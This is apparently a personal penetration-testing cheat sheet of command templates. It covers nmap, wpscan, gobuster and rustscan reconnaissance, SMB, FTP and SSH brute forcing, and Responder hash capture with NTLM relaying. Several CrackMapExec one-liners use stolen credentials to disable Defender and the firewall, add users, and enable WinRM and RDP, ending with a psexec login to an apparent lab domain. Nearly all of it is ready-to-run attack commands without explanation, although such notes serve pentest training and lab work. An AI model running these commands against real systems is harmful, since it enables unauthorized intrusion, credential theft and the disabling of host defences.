# plateform/linux #target/remote #cat/RECON #tag/scan

##nmap - savitar 1
```
nmap -sS -p- --open -n -Pn <ip> -oG <name>
```
## nmap - savitar sVC
```
nmap -sCV -p<ports> <ip> -oA <name> --stylesheet /home/kermit/nmap-bootstrap.xsl
```
##nmap - ipv6
```
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -6 <ip> -oG <name>
```
##nmap - update
```
nmap --script-updatedb
```
##nmap - directories
```
nmap --script http-enum -p<port> <ip> -oGN <name>
```
##nmap - http methods
```
nmap --script -sV -p<port> <ip> http-methods --script-args http-methods.url-path=<path>
```
##nmap - shell shock
```
nmap --script http-shellshock --script-args uri=<path> -p<port> <ip>
```
##nmap - vulnerabilities
```
nmap --script "exploit and vuln and intrusive" --script-args uri=<path> -p<port> <ip>
```
## nmap smb enum without credentials
```
nmap --script smb-enum-shares,smb-os-discovery,smb2-security-mode.nse,smb-enum-sessions,smb-enum-domains,smb-enum-groups,smb-enum-users,smb-server-stats -p<port> <ip>
```
## nmap smb enum with credentials
```
nmap --script smb-enum-shares,smb-os-discovery,smb2-security-mode.nse,smb-enum-sessions,smb-enum-domains,smb-enum-groups,smb-enum-users,smb-server-stats --script-args smbusername=<user>,smbpassword=<pass> -p<port> <ip>
```
## nmap smb brute force
```
nmap --script smb-brute --script-args userdb=<usernames>,passdb=<passwords> -p<port> <ip>
```
## nmap ssl heart bleed
```
nmap --script ssl-heartbleed.nse -p<port> <ip>
```
## nmap ftp brute force
```
nmap --script ftp-anon,ftp-brute --script-args --script-args userdb=<usernames>,passdb=<passwords> -p<port> <ip>
```
## nmap ssh
```
nmap --script ssh2-enum-algos,ssh_hostkey,ssh-auth-methods --script-args ssh_hostkey=full -p <port> <ip>
```
## nmap ssh bruteforce
```
nmap --script ssh-brute --script-args userdb=<usernames>,passdb=<passwords> -p<ports> <ip>
```
## nmap proxychains
```
proxychains nmap -sT -Pn -p<ports> -T5 -v -n <ip> 2>/dev/null -oN <file>
```
## nmap xargs
```
seq 1 65535 | xargs -P 100 -I {} proxychains nmap -sT -p{} -Pn -open -T5 -v -n <ip> 2>&1 | grep "tcp open"
```
## wpscan enumerate users
```
wpscan --url "<url>" --enumerate u --api-token="token"
```
## wpscan enumerate vulnerable plugins
```
wpscan --url "<url>" -e vp --api-token="token"
```
## wpscan enumerate hard
```
wpscan --url "<url>" --enumerate u,vp --plugins-detection aggressive --api-token=$wpscan
```
## gobuster directories
```
gobuster dir -u <url> -w <directory> -t 20 -x html,php,txt
```
## gobuster subdomains
```
gobuster vhost -u <url> -w <subdomains> -t 200 -k
```
## gobuster directories proxy 
```
gobuster dir --proxy '<proxy>' -u <url> -w <directory> -t 20 -x html,php,txt

```
## gobuster subdomains proxy 
```
gobuster vhost --proxy '<proxy>' -u <url> -w <subdomains> -t 20 -x html,php,txt

```
## gobuster
```
wfuzz -c -t 200 --hc=404 <directory> <url>
```
## wafw00f
```
wafw00f <url>
```
## responder netNTLMv2 hashes
```
responder -I <interface> -wdv | tee -a <hashes>; grep "Hash" <hashes> | awk '{print $2}' FS=": " | tee >(sed $'s/\033[[][^A-Za-z]*m//g' > <hashes>)
```
## rustscan
```
rustscan -a <ip> --ulimit 100 -t 5 -- -n -Pn -oG <name>
```
## rustscan ports
```
rustscan -a <ip> --ulimit 100 -t 5 -p<ports> -- -n -Pn -sCV -oN <name>
```
## cme enable winrm
```
cme smb <ip> -u '<user>' -p '<pass>' -x 'powershell Enable-PSRemoting'
```
## cme --loggedon-users
```
cme smb <ip> -u '<user>' -p '<pass>' --loggedon-users
```
## cme create user
```
cme smb <ip> -u '<user>' -p '<password>' 'net user <user> /add'
```
## cme execution policy
```
cme smb <ip> -u '<user>' -p '<password>' 'Set-ExecutionPolicy unrestricted'
```
## cme disable defender
```
cme smb <ip> -u '<user>' -p '<password>' 'Set-MpPreference -DisableRealtimeMonitoring $true'
```
## cme disable firewall
```
cme smb <ip> -u '<user>' -p '<password>' 'NetSh Advfirewall set allprofiles state off'
```
## cme enable rdp
```
cme smb <ip> -u '<user>' -p '<password>' -M rdp -o action=enable 
```
## responder NTLM relay
```
responder -I <interface> -wdv
```
## ntlmrelay ipv6
```
ntlmrelayx.py -6 -wh 192.168.1.76 -t smb://<ip> -socks -debug -smb2support
```
## impacket wmiexec
```
impacket-psexec s4vicorp.local/<user>:'<pass>'@<ip> powershell.exe
```
